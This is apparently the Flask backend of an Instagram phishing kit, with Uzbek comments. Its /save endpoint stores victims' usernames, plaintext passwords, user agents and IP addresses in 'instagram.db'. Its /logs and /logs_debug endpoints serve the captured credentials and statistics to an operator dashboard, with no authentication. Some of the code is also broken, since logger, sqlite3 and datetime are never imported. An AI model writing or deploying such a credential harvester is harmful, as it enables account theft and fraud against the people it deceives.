from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS
import database
import os

app = Flask(__name__, static_folder='../frontend', static_url_path='')
CORS(app, resources={r"/*": {"origins": "*"}})
database.init_db()

# Barcha route'lar uchun CORS headers
@app.after_request
def after_request(response):
    response.headers.add('Access-Control-Allow-Origin', '*')
    response.headers.add('Access-Control-Allow-Headers', 'Content-Type,Authorization')
    response.headers.add('Access-Control-Allow-Methods', 'GET,PUT,POST,DELETE,OPTIONS')
    return response

# Frontend fayllarini uzatish
@app.route('/')
def index():
    return send_from_directory(app.static_folder, 'index.html')

@app.route('/dashboard')
def dashboard():
    return send_from_directory(app.static_folder, 'dashboard.html')

@app.route('/<path:filename>')
def serve_static(filename):
    return send_from_directory(app.static_folder, filename)

# API endpoints
@app.route('/save', methods=['POST', 'OPTIONS'])
def save():
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.json
        username = data.get('username', '')
        password = data.get('password', '')
        user_agent = data.get('userAgent', request.headers.get('User-Agent', ''))
        ip_address = request.remote_addr

        database.save_log(username, password, user_agent, ip_address)
        return jsonify({'status': 'success', 'message': 'Saved'}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/logs', methods=['GET', 'OPTIONS'])
def logs():
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        # Database statistikasini olish
        total, today, last, top_ip_data = database.get_stats()
        
        # Loglarni olish
        logs_data = database.get_logs(limit=100)
        
        # Format loglarni
        logs_list = []
        for log in logs_data:
            logs_list.append({
                'id': log[0],
                'username': log[1],
                'password': log[2],
                'timestamp': log[3],
                'user_agent': log[4],
                'ip_address': log[5]
            })
        
        # Top IP ma'lumotlarini ajratish
        top_ip = top_ip_data[0] if top_ip_data else None
        top_ip_count = top_ip_data[1] if top_ip_data else 0
        
        return jsonify({
            'status': 'success',
            'total': total,
            'today': today,
            'last': last,
            'top_ip': top_ip,
            'top_ip_count': top_ip_count,
            'logs': logs_list
        }), 200
        
    except Exception as e:
        logger.error(f"Logs endpoint error: {str(e)}")
        import traceback
        logger.error(traceback.format_exc())
        return jsonify({
            'status': 'error',
            'error': str(e),
            'message': 'Internal server error'
        }), 500

@app.route('/delete_log/<int:log_id>', methods=['DELETE', 'OPTIONS'])
def delete_single_log(log_id):
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        conn = sqlite3.connect('instagram.db')
        cursor = conn.cursor()
        cursor.execute('DELETE FROM logs WHERE id = ?', (log_id,))
        deleted_count = cursor.rowcount
        conn.commit()
        conn.close()
        
        if deleted_count > 0:
            logger.info(f"Deleted log with ID: {log_id}")
            return jsonify({'status': 'success', 'message': f'Log {log_id} deleted'}), 200
        else:
            return jsonify({'status': 'error', 'message': 'Log not found'}), 404
    except Exception as e:
        logger.error(f"Error deleting log: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/server_logs', methods=['GET'])
def server_logs():
    try:
        log_file = 'server.log'
        if os.path.exists(log_file):
            with open(log_file, 'r') as f:
                logs = f.readlines()[-50:]  # oxirgi 50 qator
                return jsonify({
                    'status': 'success',
                    'logs': logs
                }), 200
        else:
            return jsonify({
                'status': 'success',
                'logs': ["Log file not found"]
            }), 200
    except Exception as e:
        logger.error(f"Error getting server logs: {e}")
        return jsonify({'error': str(e)}), 500
    
@app.route('/test', methods=['GET'])
def test_endpoint():
    """Test endpoint for debugging"""
    try:
        import traceback
        from database import get_connection
        
        # Database connection test
        conn = get_connection()
        cursor = conn.cursor()
        
        # 1. Table mavjudligini tekshirish
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='logs'")
        table_exists = cursor.fetchone()
        
        # 2. Table yaratish
        if not table_exists:
            cursor.execute('''
                CREATE TABLE logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT NOT NULL,
                    password TEXT NOT NULL,
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                    user_agent TEXT,
                    ip_address TEXT
                )
            ''')
            conn.commit()
        
        # 3. Rowlar soni
        cursor.execute("SELECT COUNT(*) FROM logs")
        count = cursor.fetchone()[0]
        
        conn.close()
        
        return jsonify({
            'status': 'success',
            'message': 'Test endpoint working',
            'table_exists': table_exists is not None,
            'row_count': count,
            'timestamp': datetime.now().isoformat()
        }), 200
        
    except Exception as e:
        import traceback
        error_details = traceback.format_exc()
        logger.error(f"Test endpoint error: {e}\n{error_details}")
        return jsonify({
            'status': 'error',
            'error': str(e),
            'traceback': error_details
        }), 500

@app.route('/logs_debug', methods=['GET'])
def logs_debug():
    """Debug uchun soddalashtirilgan logs endpoint"""
    try:
        from database import get_connection
        
        conn = get_connection()
        cursor = conn.cursor()
        
        # Simple query
        cursor.execute("SELECT * FROM logs ORDER BY timestamp DESC LIMIT 10")
        rows = cursor.fetchall()
        
        # Convert to list
        logs_list = []
        for row in rows:
            logs_list.append({
                'id': row[0],
                'username': row[1],
                'password': row[2],
                'timestamp': row[3],
                'user_agent': row[4],
                'ip_address': row[5]
            })
        
        # Simple stats
        cursor.execute("SELECT COUNT(*) FROM logs")
        total = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(*) FROM logs WHERE date(timestamp) = date('now')")
        today = cursor.fetchone()[0]
        
        conn.close()
        
        return jsonify({
            'status': 'success',
            'total': total,
            'today': today,
            'logs': logs_list,
            'message': f'Found {len(logs_list)} logs'
        }), 200
        
    except Exception as e:
        import traceback
        logger.error(f"Logs debug error: {e}\n{traceback.format_exc()}")
        return jsonify({
            'status': 'error',
            'error': str(e),
            'message': 'Database error'
        }), 500

if __name__ == '__main__':

    app.run(host='0.0.0.0', port=5000, debug=True)

